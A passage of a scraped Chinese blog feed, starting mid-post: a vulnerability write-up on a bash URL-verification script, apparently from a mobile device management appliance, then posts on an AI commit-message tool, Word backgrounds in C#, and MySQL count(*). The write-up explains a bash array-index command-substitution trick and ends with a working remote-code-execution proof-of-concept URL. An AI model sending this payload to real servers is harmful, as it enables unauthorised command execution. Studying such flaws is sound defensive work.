logDenial \"${FUNCNAME}\" \"${ret}\" \"link too late: theCurrentTimeSeconds=${theCurrentTimeSeconds}; ${1}\"\n        fi\n      else\n        ret=\"${kTooEarlyErrorCode}\"\n        logDenial \"${FUNCNAME}\" \"${ret}\" \"link too early: theCurrentTimeSeconds=${theCurrentTimeSeconds}; ${1}\"\n      fi\n    else\n      ret=\"${kKeyIndexOutOfBoundsErrorCode}\"\n      logDenial \"${FUNCNAME}\" \"${ret}\" \"key index out of bounds: ${1}\"\n    fi\n  else\n    ret=\"${kURLStructureInvalidErrorCode}\"\n    logDenial \"${FUNCNAME}\" \"${ret}\" \"URL not structurally correct: ${1}\"\n  fi\n  # tell httpd what file to send (or error message)\n  echo \"${ret}\"\n}\n\nif ${gTestMode} ; then\n  readSaltFile\n  verifyURLConsistency \"${1}\"\nelse\n  logDebug \"MAIN\" looping\n  readSaltFile\n\n  while read theCurrentLine; do\n    readSaltFile\n    logDebug \"MAIN\" \"${theCurrentLine}\"\n    verifyURLConsistency \"${theCurrentLine}\"\n  done\nfi\n\n\n</code></pre>\n<p>但内容太多了，我们还是请AI老师帮我们统一分析一下</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>AI老师帮我们分析并得到了一个传参请求，然后我们还得去apache的配置文件看看入口路径是什么，在/etc/httpd/conf.d/ssl.conf文件中找找相关的内容,由于配置文件内容太多了这里就不贴了，我也懒得找，还是让AI老师帮我们找找吧。</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>deepseek老师还是太善解人意了，直接给了一个标准请求：</p>\n<pre><code>/mifs/c/appstore/fob/3/1120/sha256:kid=1,st=1666663066,et=1666670266,h=a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2/75dc90fe-6ae7-4377-913b-7248334d39dc.ipa\n</code></pre>\n<p>但这些传参到bash中，并没有找到明显的直接命令执行的点，这时我们需要再理解一下bash脚本，首先看bash脚本中的开头：</p>\n<pre><code>gKeyIndex=\"\"\ngStartTime=\"\"\ngEndTime=\"\"\ngHashPrefixString=\"\"\ngPath=\"\"\n\nIFS=',' read -ra theAppStoreKeyValueArray\n</code></pre>\n<p>脚本会用 <code>IFS=','</code> 把传入的参数分割成数组 <code>theAppStoreKeyValueArray</code>，传参后是这样的数组：</p>\n<pre><code>[\"kid=1\", \"st=1444444444\", \"et=1444444444\", \"h=a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2\"]\n</code></pre>\n<p>然后在下方有这样的一段循环：</p>\n<pre><code>  if [[ -z ${ret} ]] ; then\n    for theKeyMapEntry in \"${theAftStoreKeyValueArray[@]}\" ; do\n      theKey=\"${theKeyMapEntry%%=*}\"\n      theValue=\"${theKeyMapEntry##*=}\"\n</code></pre>\n<p>它把传参的这些参数名和值循环赋值给了theKey和theValue，然后又被赋值到全局变量gKeyIndex、gStartTime、gEndTime、gHashPrefixString中，继续跟下去，看看这些值在哪里用到。</p>\n<p>key参数赋值到了变量gKeyIndex，最终在这里应用：</p>\n<pre><code>kAppStoreSaltFile=\"/mi/files/appstore-salt.txt\"\ngSalt=\"\" \n\nif [[ -f ${kAppStoreSaltFile} ]]; then\n  gSalt=$(sed -n \"${gKeyIndex}p\" \"${kAppStoreSaltFile}\")\n  if [[ -z ${gSalt} ]]; then\n    ret=\"${kSaltIndexInvalidErrorCode}\"\n    logDenial \"${FUNCNAME}\" \"${ret}\" \"kid(${gKeyIndex}) is invalid (no salt found)\"\n  fi\nelse\n  ret=\"${kSaltFileMissingErrorCode}\"\n  logDenial \"${FUNCNAME}\" \"${ret}\" \"Salt file ${kAppStoreSaltFile} not found\"\nfi\n</code></pre>\n<p>它是用来读取/mi/files/appstore-salt.txt对应行的，这个文件里面的hash值读取出来用来校验后续参数。</p>\n<p>st 参数最终赋值给了gStartTime，分别在两个地方被调用：</p>\n<pre><code>kValidTimeStampLength=10 \n\ncase ${theKey} in\n  st)\n    gStartTime=\"${theValue}\"\n    if (( ${#gStartTime} != \"${kValidTimeStampLength}\" )); then\n      ret=\"${kTimestampLengthInvalidErrorCode}\"\n    fi\n    ;;\n</code></pre>\n<p>这里判断了这个参数是否长度为10。</p>\n<pre><code>theCurrentTimeSeconds=$(date +%s)\n\nif [[ ${theCurrentTimeSeconds} -gt ${gStartTime} ]]; then\n  logDebug \"${FUNCNAME}\" \"Current time(${theCurrentTimeSeconds}) &gt; start time(${gStartTime})\"\n  # ... \nelse\n  ret=\"${kRequestExpiredErrorCode}\"\n  logDenial \"${FUNCNAME}\" \"${ret}\" \"Start time(${gStartTime}) is in the future\"\nfi\n</code></pre>\n<p>这里用来比较当前时间是否晚于请求开始时间。</p>\n<p>et 参数（gEndTime）和gStartTime的用处差不多，也校验了长度和用于验证当前时间≤结束时间。</p>\n<p>h 参数（gHashPrefixString）是用于hash校验的值。</p>\n<p>看上去还是没有直观的命令执行的代码，别急，我们再引入一个知识点。</p>\n<p>首先给大家看一个脚本：</p>\n<pre><code>#!/bin/bash\narr=\"\" \nvar=\"arr[`echo 'hacked' &gt; ./hack_mht`0]\"\n[[ 1 -gt $var ]] \n\nif [[ -f ./hack_mht ]]; then\n    echo \"执行成功！\"\nelse\n    echo \"未执行\"\nfi\n</code></pre>\n<p>bro们觉得这个脚本能成功执行命令吗？</p>\n<p>答案：</p>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>为什么会这样捏，因为在bash中，数值比较功能可以解析array[index]这样的数值索引，index会被优先解析为算数表达式，比如array[1+1]，会先计算1+1，而bash又有一个命令替换的优先级规则，如果你把array[1+1]改为</p>\n<pre><code>array[`echo 111`]\n</code></pre>\n<p>则先执行被反引号包裹的命令，举例：</p>\n<pre><code>current_date=`date`\necho \"今天是: $current_date\"\necho \"当前目录: `pwd`\"\n</code></pre>\n<p>显然在if [[ ${theCurrentTimeSeconds} -gt ${gStartTime} ]]; 和if [[ ${theCurrentTimeSeconds} -lt ${gEndTime} ]] ; 中都存在这个条件，但我们之前说了，gStartTime和gEndTime都做了长度校验的，必须为十位，这就很鸡肋了，那怎么样才能绕过这个问题呢？</p>\n<p>回到最开始的定义变量与循环：</p>\n<pre><code>  if [[ -z ${ret} ]] ; then\n    for theKeyMapEntry in \"${theAftStoreKeyValueArray[@]}\" ; do\n      theKey=\"${theKeyMapEntry%%=*}\"\n      theValue=\"${theKeyMapEntry##*=}\"\n</code></pre>\n<p>bash中使用theKey和theValue循环赋值，传参的最后一个值为h，所以theValue最后的值是就是h的值，那现在就很有意思了，gStartTime和gEndTime都有长度限制，但h的值没有，能不能让h的值走到if [[ ${theCurrentTimeSeconds} -gt ${gStartTime} ]]; then里面去应用数值索引+命令替换呢？</p>\n<p>可以的，既然在bash中有变量theValue=h传参，那我们就直接让gStartTime=theValue，最终流程：可控h参数-&gt;theValue-&gt;gStartTime，然后进入if [[ ${theCurrentTimeSeconds} -gt ${gStartTime} ]];应用数值索引+命令替换，现在我们已经有了RCE的完整链条，开始构造最终poc。</p>\n<p>kid参数为文件行数，随便用个1，st参数为theValue，注意十位长度校验，所以还需要再加两个空格，et参数也参与比较，也可作为theValue传参，st与et随便一个地方设置为theValue都可以，最后是h参数，只需要满足array[index]即可。</p>\n<p>index部分的内容有了，array部分写什么呢，bash开头开启了set -o nounset，这是严格模式，严格模式下，Bash 遇到未定义的变量会直接终止脚本执行，直接从bash开头定义的那些空变量里面选一个，比如gPath和gHostname都可以，构造最终值：</p>\n<pre><code>gHostname[`id &gt; /mi/bin/mht`]\n</code></pre>\n<p>最终poc：</p>\n<pre><code>/mifs/c/appstore/fob/3/1120/sha256:kid=1,st=1111111111,et=theValue%20%20,h=gHostname%5B%60id%20&gt;%20/mi/bin/mht%60%5D/mht.ipa\n</code></pre>\n<p><img alt=\"\" class=\"lazyload\" /></p>\n<p>该漏洞复现环境已在无境中上架：vip.bdziyi.com/ulab，无境，英文名Unbounded Lab，是专为网络安全学习者打造的综合性实战平台，提供真实企业级漏洞环境，让您在安全的环境中提升实战技能，核心特色：独立隔离环境，每位用户都拥有<strong>完全独立</strong>的靶场环境，即使是庞大的内网靶场，环境之间也是<strong>零干扰</strong>，确保您的学习过程不受任何影响。</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-02 18:41</span>&nbsp;\n<a href=\"https://www.cnblogs.com/mhtsec\">公众号棉花糖fans</a>&nbsp;\n阅读(<span id=\"post_view_count\">0</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "GIM 2.0 发布：真正让 AI 提交消息可定制、可控、可项目级优化",
      "link": "https://www.cnblogs.com/somefuture/p/19565738",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/somefuture/p/19565738\" id=\"cb_post_title_url\" title=\"发布于 2026-02-02 17:37\">\n    <span>GIM 2.0 发布：真正让 AI 提交消息可定制、可控、可项目级优化</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>大家好，<strong>GIM（Git Intelligence Message）2.0</strong> 正式发布啦！</p>\n<p>GIM 是一个 <strong>基于变更内容自动生成高质量 Git 提交消息的命令行工具</strong>，它利用 AI 帮你写更规范、更语义化、可读性更强的 commit message。相比 1.x 系列，<strong>2.0 是一次核心能力升级</strong>，重点解决了 AI 提交生成在真实项目中最常见的定制与一致性痛点。</p>\n<p>官方网站：<a href=\"https://git-intelligence-message.pages.dev/\" rel=\"noopener nofollow\" target=\"_blank\">https://git-intelligence-message.pages.dev/</a><br />\n仓库地址：<a href=\"https://github.com/davelet/git-intelligence-message\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/davelet/git-intelligence-message</a></p>\n<hr />\n<h2 id=\"gim-20-核心更新能力\">GIM 2.0 核心更新能力</h2>\n<h3 id=\"1-本地项目-prompt-支持gim-目录\">1. 本地项目 Prompt 支持（.gim 目录）</h3>\n<p>2.0 版本允许在 Git 仓库根目录创建一个 <code>.gim</code> 文件夹，用于存放项目 <strong>私有 Prompt 模板</strong>：</p>\n<pre><code>your-project/\n├── .git/\n├── .gim/\n│   ├── diff_prompt\n│   └── subject_prompt\n</code></pre>\n<p>这意味着：</p>\n<ul>\n<li>各个项目可以定义自己的 AI 提示模板</li>\n<li>不同项目无需共享或修改全局配置</li>\n<li>团队规范、提交风格可以直接写在仓库里，<strong>团队成员天然统一</strong></li>\n</ul>\n<hr />\n<h3 id=\"2-命令行临时覆盖-prompt\">2. 命令行临时覆盖 Prompt</h3>\n<p>在之前版本，Prompt 模板只能通过全局配置文件维护，无法灵活覆盖；<br />\n而 2.0 引入命令参数：</p>\n<pre><code>--diff-prompt &lt;STRING&gt;\n--subject-prompt &lt;STRING&gt;\n</code></pre>\n<p>例如：</p>\n<pre><code class=\"language-bash\">gim --diff-prompt \"专注变更安全影响分析\" \\\n    --subject-prompt \"生成遵循规范化格式的提交标题\"\n</code></pre>\n<p>这让你在<strong>一次提交中临时覆盖 AI 指引</strong>，非常适合：</p>\n<ul>\n<li>临时写“安全相关 commit”</li>\n<li>某次提交需要特别格式</li>\n<li>试验新的提示策略</li>\n</ul>\n<hr />\n<h1 id=\"prompt-优先级\">Prompt 优先级</h1>\n<ol>\n<li>命令行（最高）</li>\n<li>项目级 .gim 目录</li>\n<li>全局 config</li>\n<li>内置默认</li>\n</ol>\n<h3 id=\"项目层统一提交规范\">项目层统一提交规范</h3>\n<p>在项目根目录：</p>\n<pre><code class=\"language-bash\">mkdir .gim\necho \"分析变更时突出安全性影响\" &gt; .gim/diff_prompt\necho \"按规范化格式生成提交标题\" &gt; .gim/subject_prompt\n</code></pre>\n<p>所有团队成员无需各自配置，全程统一。</p>\n<h3 id=\"临时覆盖-prompt\">临时覆盖 Prompt</h3>\n<pre><code class=\"language-bash\">gim --diff-prompt \"侧重性能改进\" \\\n    --subject-prompt \"性能优化提交\"\n</code></pre>\n<h1 id=\"推荐用法\">推荐用法</h1>\n<pre><code>gim 根据暂存区的文件变更内容生成提交消息并提交\ngim -a 自动暂存尚未暂存的变更，并生成提交消息提交\ngim -p 将本次暂存的变更内容合并到上一次提交中，并根据这两次变更生成提交消息提交（就是--amend）\ngim -ap 相当于gim -a后gim -p，先暂存，再合并提交\ngim -t &lt;SUB&gt; 指定提交的标题。不指定-t参数的话，标题是根据消息内容自动总结出来的\ngim update 更新软件版本，也可以brew upgrade git-intelligence-message\ngim ai -m &lt;model&gt; -k &lt;apikey&gt; -u &lt;url&gt; -l &lt;language&gt; 设置AI参数。这个命令是前置命令，没有设置的话，上面携带参数的执行都会失败。-l有默认值，是英语，可以不用提供；-u是api调用的地址，软件内置了一些地址，可以查看 https://github.com/davelet/git-intelligence-message?tab=readme-ov-file#built-in-model-support ，如果模型名称能匹配上前缀也可以不提供。1.3.2版本开始，如果gim ai命令没携带参数，将输出当前配置\ngim -v 任何命令都可以增加-v参数，用于查看命令的详细执行过程，v表示 verbose\ngim prompt 查看当前提示词。增加--edit可以编辑提示词，增加--prompt &lt;P&gt;用于指定编辑文件\n更详细的用法可以通过-h查看帮助信息。比如\n\ngim -h\ngim ai -h\ngim update -h\ngim prompt -h\n</code></pre>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-02 17:37</span>&nbsp;\n<a href=\"https://www.cnblogs.com/somefuture\">大卫小东（Sheldon）</a>&nbsp;\n阅读(<span id=\"post_view_count\">3</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "C# 设置 Word 文档背景颜色/背景图",
      "link": "https://www.cnblogs.com/jazz-z/p/19565731",
      "published": "",
      "description": "<div class=\"postcontent\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>在 .NET 开发场景中，对 Word 文档进行自动化格式处理是常见需求，其中设置文档背景（颜色或图片）是提升文档视觉呈现的基础操作。Free Spire.Doc for .NET 作为一款免费的 Word 文档操作组件，无需依赖 Microsoft Office 即可完成 Word 文档的创建、编辑与格式调整，本文将介绍如何通过该组件在 C# 中为 Word 文档设置背景颜色或背景图片。</p>\n<h2 id=\"一环境准备\">一、环境准备</h2>\n<p>Free Spire.Doc for .NET 支持通过 NuGet 包管理器快速安装，这是最便捷的方式：</p>\n<ul>\n<li>打开 Visual Studio，创建任意 .NET 项目（如 Console App、ASP.NET Core等）；</li>\n<li>右键项目→“管理NuGet程序包”→搜索“Free Spire.Doc”→安装最新版本；</li>\n<li>也可通过NuGet命令行安装：</li>\n</ul>\n<pre><code class=\"language-bash\">Install-Package FreeSpire.Doc\n</code></pre>\n<h2 id=\"二设置-word-文档背景颜色\">二、设置 Word 文档背景颜色</h2>\n<p>Free Spire.Doc 提供了 <code>Document.Background</code> 核心属性，需先通过 <code>Background.Type</code> 指定背景类型为 <code>Color</code>，再通过 <code>Background.Color</code> 设置具体颜色。</p>\n<p><strong>完整代码示例：</strong></p>\n<pre><code class=\"language-csharp\">using Spire.Doc;\nusing System.Drawing;\nusing Spire.Doc.Documents;\n\nnamespace ConvertWordToPng\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            // 创建Document实例\n            Document document = new Document();\n\n            // 加载本地已有Word文档\n            document.LoadFromFile(\"Test.docx\"); \n\n            // 指定文档背景类型\n            document.Background.Type = BackgroundType.Color;\n\n            // 设置具体的背景颜色\n            document.Background.Color = Color.AliceBlue; \n\n            // 保存修改后的文档\n            document.SaveToFile(\"纯色背景.docx\", FileFormat.Docx);\n        }\n    }\n}\n</code></pre>\n<h2 id=\"三设置-word-文档背景图片\">三、设置 Word 文档背景图片</h2>\n<p>设置背景图片则只需将 <code>Background.Type</code> 改为 <code>BackgroundType.Picture</code>，再通过 <code>Picture</code> 属性指定图片路径即可。</p>\n<p><strong>完整代码示例</strong></p>\n<pre><code class=\"language-csharp\">using Spire.Doc;\nusing System.Drawing;\nusing Spire.Doc.Documents;\n\nnamespace ConvertWordToPng\n{\n    class Program\n    {\n        static void Main(string[] args)\n        {\n            try\n            {\n                // 创建Document实例并加载源文档\n                Document document = new Document();\n                document.LoadFromFile(\"Test.docx\");\n\n                // 指定背景类型为“图片”\n                document.Background.Type = BackgroundType.Picture;\n                // 设置背景图片\n                document.Background.Picture = Image.FromFile(\"background.jpg\");\n\n                // 保存文档\n                document.SaveToFile(\"PictureBackground.docx\", FileFormat.Docx);\n\n                Console.WriteLine(\"背景图片设置完成！\");\n            }\n            catch (Exception ex)\n            {\n                // 捕获文件不存在、图片格式错误等异常\n                Console.WriteLine($\"操作失败：{ex.Message}\");\n            }\n        }\n    }\n}\n</code></pre>\n<h3 id=\"注意事项\">注意事项</h3>\n<ul>\n<li>图片格式支持：JPG、PNG、BMP 等常见格式均可，建议使用与文档页面尺寸（A4 默认 210×297mm）匹配的图片，避免显示变形；</li>\n<li>显示模式：背景图片默认以 “平铺” 方式显示，暂不支持直接设置 “拉伸” 模式，若需拉伸效果，可先通过 <code>System.Drawing</code> 调整图片尺寸后再设置；</li>\n<li>路径问题：图片路径建议使用绝对路径（如 <code>D:\\docs\\background_img.png</code>），避免相对路径导致的文件查找失败。</li>\n</ul>\n<hr />\n<p>通过本文介绍的方法，开发者可以在 C# 应用程序中轻松实现文档背景的自定义。虽然免费版本存在一些篇幅限制，但对于基本的文档处理需求而言，它仍然是一个功能完善且易于使用的解决方案。</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"itemdesc\">\n                发表于 \n<span id=\"post-date\">2026-02-02 17:35</span>&nbsp;\n<a href=\"https://www.cnblogs.com/jazz-z\">LAYONTHEGROUND</a>&nbsp;\n阅读(<span id=\"post_view_count\">6</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n\n            </div>"
    },
    {
      "title": "【面试题】MySQL 中 count(*)、count(1) 和 count(字段名) 有什么区别？",
      "link": "https://www.cnblogs.com/sun-10387834/p/19452600",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/sun-10387834/p/19452600\" id=\"cb_post_title_url\" title=\"发布于 2026-02-02 16:25\">\n    <span>【面试题】MySQL 中 count(*)、count(1) 和 count(字段名) 有什么区别？</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"mysql-中的-count-三兄弟效率大比拼\">MySQL 中的 count 三兄弟：效率大比拼！🚀</h1>\n<h2 id=\"一快速结论先看结论再看分析\">一、快速结论（先看结论再看分析）</h2>\n<table>\n<thead>\n<tr>\n<th>方式</th>\n<th>作用</th>\n<th>效率</th>\n<th>一句话总结</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><code>count(*)</code></td>\n<td><strong>统计所有行数</strong></td>\n<td>⭐⭐⭐⭐ <strong>最高</strong></td>\n<td>我是专业的！我为统计而生</td>\n</tr>\n<tr>\n<td><code>count(1)</code></td>\n<td>统计所有行数</td>\n<td>⭐⭐⭐⭐ 同样高效</td>\n<td>我是 count(*) 的马甲兄弟</td>\n</tr>\n<tr>\n<td><code>count(列名)</code></td>\n<td>统计该列<strong>非 NULL</strong> 的行数</td>\n<td>⭐⭐⭐ 较慢</td>\n<td>我挑剔，我只数非空值</td>\n</tr>\n</tbody>\n</table>\n<p><strong>结论：用 <code>count(*)</code> 就对了！</strong> ✅</p>\n<h2 id=\"二代码示例亲测三兄弟的差别\">二、代码示例：亲测三兄弟的差别</h2>\n<h3 id=\"准备测试数据\">准备测试数据</h3>\n<pre><code class=\"language-sql\">-- 创建测试表\nCREATE TABLE user_test (\n    id INT PRIMARY KEY AUTO_INCREMENT,\n    name VARCHAR(50),\n    age INT,\n    email VARCHAR(100)\n);\n\n-- 插入测试数据（故意插入一些NULL值）\nINSERT INTO user_test (name, age, email) VALUES\n('张三', 25, 'zhangsan@example.com'),\n('李四', NULL, NULL),\n('王五', 30, 'wangwu@example.com'),\n(NULL, 28, 'unknown@example.com'),\n('赵六', 35, NULL);\n</code></pre>\n<h3 id=\"测试查询\">测试查询</h3>\n<pre><code class=\"language-sql\">-- 查看表中的数据\nSELECT * FROM user_test;\n/*\n+----+--------+------+--------------------+\n| id | name   | age  | email              |\n+----+--------+------+--------------------+\n|  1 | 张三   |   25 | zhangsan@example...|\n|  2 | 李四   | NULL | NULL               |\n|  3 | 王五   |   30 | wangwu@example.com |\n|  4 | NULL   |   28 | unknown@example.com|\n|  5 | 赵六   |   35 | NULL               |\n+----+--------+------+--------------------+\n*/\n\n-- 测试1：count(*) 统计所有行数\nSELECT count(*) FROM user_test;  -- 结果：5 ✅\n-- 翻译：\"老板，我有多少行数据？全都要！\"\n\n-- 测试2：count(1) 统计所有行数  \nSELECT count(1) FROM user_test;  -- 结果：5 ✅\n-- 翻译：\"老板，你给我个固定值1，我数有多少个1\"\n\n-- 测试3：count(列名) 统计非NULL的行数\nSELECT count(name) FROM user_test;  -- 结果：4 ❗（NULL的那行没算）\nSELECT count(age) FROM user_test;   -- 结果：4 ❗（NULL的那行没算）\nSELECT count(email) FROM user_test; -- 结果：3 ❗（两个NULL都没算）\n-- 翻译：\"我只数有身份证的人，黑户不算\"\n</code></pre>\n<h2 id=\"三深入剖析它们到底有啥不同\">三、深入剖析：它们到底有啥不同？</h2>\n<h3 id=\"1-语义区别最重要的区别\">1. <strong>语义区别（最重要的区别！）</strong></h3>\n<pre><code class=\"language-sql\">-- count(*) 是 SQL 标准写法\n-- 意思：给我这个表有多少行数据\n-- 相当于：\"这个会议室有多少个座位？\"\n\n-- count(1) 是 count(*) 的一种写法\n-- 意思：统计有多少个1\n-- 相当于：\"给每个座位发个苹果，最后数苹果\"\n\n-- count(列名) 是统计该列非NULL值的数量\n-- 意思：这个会议室有多少人带了手机\n-- 相当于：\"检查每个座位，如果有人带了手机就计数\"\n</code></pre>\n<h3 id=\"2-性能区别神话与现实\">2. <strong>性能区别（神话与现实）</strong></h3>\n<h4 id=\"传说中的误解\">传说中的误解：</h4>\n<blockquote>\n<p>\"count(1) 比 count(*) 快\" ❌<br />\n\"count(主键) 最快\" ❌</p>\n</blockquote>\n<h4 id=\"现实真相\">现实真相：</h4>\n<p><strong>MySQL 5.7 及以后版本</strong>：</p>\n<ul>\n<li><code>count(*)</code> 和 <code>count(1)</code> 性能<strong>完全相同</strong></li>\n<li>MySQL 优化器会把它们当作一回事</li>\n</ul>\n<p><strong>查看执行计划证明</strong>：</p>\n<pre><code class=\"language-sql\">EXPLAIN SELECT count(*) FROM user_test;\nEXPLAIN SELECT count(1) FROM user_test;\nEXPLAIN SELECT count(id) FROM user_test;\n-- 你会看到：前两个的执行计划完全一样！\n</code></pre>\n<p><strong>性能排序</strong>（一般情况）：</p>\n<ol>\n<li><code>count(*)</code> ≈ <code>count(1)</code> ⭐⭐⭐⭐⭐</li>\n<li><code>count(主键列)</code> ⭐⭐⭐⭐</li>\n<li><code>count(非主键有索引列)</code> ⭐⭐⭐</li>\n<li><code>count(非主键无索引列)</code> ⭐⭐</li>\n</ol>\n<p><strong>为什么 <code>count(列名)</code> 可能更慢？</strong></p>\n<pre><code class=\"language-sql\">-- 假设 email 列有索引\nSELECT count(email) FROM user_test;\n/*\nMySQL 需要：\n1. 读取索引（如果该列有索引）\n2. 检查每个值是否为 NULL\n3. 只计数非 NULL 的\n\n如果 email 列没有索引：\n1. 读取整行数据（比 count(*) 读的更多）\n2. 检查 email 是否为 NULL\n3. 只计数非 NULL 的\n*/\n</code></pre>\n<h3 id=\"3-特殊情况分析\">3. <strong>特殊情况分析</strong></h3>\n<pre><code class=\"language-sql\">-- 情况1：所有列都不允许NULL\nCREATE TABLE user_not_null (\n    id INT PRIMARY KEY NOT NULL,\n    name VARCHAR(50) NOT NULL\n);\n-- 这时候：count(*) = count(id) = count(name)\n\n-- 情况2：空表 vs NULL值\nCREATE TABLE empty_table (id INT);\nSELECT count(*) FROM empty_table;    -- 结果：0\nSELECT count(id) FROM empty_table;   -- 结果：0\n\nINSERT INTO empty_table VALUES (NULL);\nSELECT count(*) FROM empty_table;    -- 结果：1\nSELECT count(id) FROM empty_table;   -- 结果：0 ❗\n</code></pre>\n<h2 id=\"四实际工作中的选择指南\">四、实际工作中的选择指南</h2>\n<h3 id=\"-场景1统计总行数\">🎯 <strong>场景1：统计总行数</strong></h3>\n<pre><code class=\"language-sql\">-- ✅ 正确做法\nSELECT count(*) FROM orders;\n\n-- ❌ 错误做法\nSELECT count(order_id) FROM orders;  -- 万一有NULL呢？\nSELECT count(1) FROM orders;         -- 能用，但不是标准\n</code></pre>\n<h3 id=\"-场景2统计有效数据数量\">🎯 <strong>场景2：统计有效数据数量</strong></h3>\n<pre><code class=\"language-sql\">-- 统计有多少用户填写了邮箱\nSELECT count(email) FROM users;  -- ✅ 这个场景就该用 count(列名)\n\n-- 统计已完成订单数量（假设 status=2 是已完成）\nSELECT count(*) FROM orders WHERE status = 2;  -- ✅\n</code></pre>\n<h3 id=\"-场景3统计非重复值\">🎯 <strong>场景3：统计非重复值</strong></h3>\n<pre><code class=\"language-sql\">-- 统计有多少个不同的城市\nSELECT count(DISTINCT city) FROM users;  -- ✅ count + DISTINCT\n\n-- 统计有多少个城市，排除 NULL\nSELECT count(DISTINCT city) FROM users;  -- DISTINCT 会自动排除 NULL\n</code></pre>\n<h2 id=\"五性能优化技巧\">五、性能优化技巧</h2>\n<h3 id=\"1-大表优化方案\">1. <strong>大表优化方案</strong></h3>\n<pre><code class=\"language-sql\">-- 方案1：使用近似值（适用于统计概览）\nSELECT TABLE_ROWS \nFROM information_schema.TABLES \nWHERE TABLE_SCHEMA = 'your_db' AND TABLE_NAME = 'big_table';\n\n-- 方案2：分页总数缓存（适用于列表页）\n-- 第一次查询时缓存总数，后面定时更新\n\n-- 方案3：使用汇总表\nCREATE TABLE stats_daily (\n    date DATE PRIMARY KEY,\n    user_count INT,\n    order_count INT\n);\n</code></pre>\n<h3 id=\"2-索引优化\">2. <strong>索引优化</strong></h3>\n<pre><code class=\"language-sql\">-- 为 count(列名) 创建索引\nCREATE INDEX idx_email ON users(email);\n\n-- 但注意：count(*) 不一定需要索引，InnoDB有优化\n</code></pre>\n<h2 id=\"六有趣比喻帮你记忆\">六、有趣比喻帮你记忆</h2>\n<h3 id=\"-汉堡店排队比喻\">🍔 <strong>汉堡店排队比喻</strong></h3>\n<pre><code class=\"language-sql\">-- 有10个人在排队买汉堡\n\ncount(*) = \"队列里有10个人\" ✅\ncount(1) = \"我给每人发个号码牌，数有10个牌\" ✅  \ncount(现金) = \"只有8个人带了现金\" ❗\ncount(会员卡) = \"只有5个人有会员卡\" ❗\n</code></pre>\n<h3 id=\"-教室点名比喻\">🏫 <strong>教室点名比喻</strong></h3>\n<pre><code class=\"language-sql\">-- 教室里有50个座位\n\ncount(*) = \"教室有50个座位\" ✅\ncount(1) = \"我在每个座位放本书，最后数有50本\" ✅\ncount(学生) = \"今天来了45个学生上课\" ❗（空座位不算）\n</code></pre>\n<h2 id=\"七总结与最佳实践\">七、总结与最佳实践</h2>\n<h3 id=\"-最终建议\">📋 <strong>最终建议</strong></h3>\n<ol>\n<li>\n<p><strong>统计总行数，一律用 <code>count(*)</code></strong></p>\n<ul>\n<li>这是 SQL 标准写法</li>\n<li>性能最优（MySQL有专门优化）</li>\n<li>语义最明确</li>\n</ul>\n</li>\n<li>\n<p><strong>统计某列非 NULL 数量，用 <code>count(列名)</code></strong></p>\n<ul>\n<li>这是它的本职工作</li>\n<li>不要用它统计总行数</li>\n</ul>\n</li>\n<li>\n<p><strong>关于 <code>count(1)</code></strong></p>\n<ul>\n<li>性能与 <code>count(*)</code> 一样</li>\n<li>但不够\"标准\"，像方言</li>\n<li>建议统一用 <code>count(*)</code></li>\n</ul>\n</li>\n<li>\n<p><strong>性能关键点</strong></p>\n<ul>\n<li>大表避免频繁 count</li>\n<li>考虑使用缓存或汇总表</li>\n<li>为 count(列名) 的列加索引</li>\n</ul>\n</li>\n</ol>\n<h3 id=\"-一张图看懂\">📊 <strong>一张图看懂</strong></h3>\n<pre><code>count(*)       -&gt; 总数 -&gt; 最快 -&gt; 推荐使用\n    ↓\ncount(1)       -&gt; 总数 -&gt; 一样快 -&gt; 可用但不标准\n    ↓\ncount(主键)    -&gt; 总数 -&gt; 次快 -&gt; 主键非NULL时可用\n    ↓\ncount(索引列)  -&gt; 非NULL数 -&gt; 较慢 -&gt; 有索引时可用\n    ↓  \ncount(普通列)  -&gt; 非NULL数 -&gt; 最慢 -&gt; 谨慎使用\n</code></pre>\n<p>记住口诀：<strong>\"数总数，用星号；数非空，列名好；数字1，虽高效，不是标准别当宝\"</strong> 🎯</p>\n\n\n</div>\n<div id=\"MySignature\">\n    \n<p>❤️ 如果你喜欢这篇文章，请点赞支持！ 👍 同时欢迎关注我的博客，获取更多精彩内容！</p>\n\n<p>本文来自博客园，作者：<a href=\"https://www.cnblogs.com/sun-10387834/\" target=\"_blank\">佛祖让我来巡山</a>，转载请注明原文链接：<a 